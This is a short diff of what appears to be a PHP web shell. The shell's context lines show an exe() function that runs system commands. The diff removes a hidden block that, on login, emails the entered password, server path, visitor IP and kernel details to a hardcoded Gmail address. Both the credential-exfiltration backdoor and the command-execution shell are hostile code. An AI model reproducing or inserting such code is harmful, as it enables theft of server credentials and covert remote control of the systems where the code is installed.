@@ -480,13 +480,7 @@ if (isset($_GET['do']) && $_GET['do'] === 'root_folders') {
     echo "</center>";
 }
 
-if (array_key_exists('loginin', $_POST)) {
-		$password = $_POST['pass'];
-		$server_name = $_SERVER['SERVER_NAME'];
-		$php_self = $_SERVER['PHP_SELF'];
-		$report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . " City: {$city}\nLogin: $server_name$php_self\nPass: $password\nKernel: $kernel";
-		@mail('wonxd67@gmail.com', 'Hehehe', $report_bug);
-		}
+
 
 function exe($cmd) {
 	if(function_exists('system')) { 		
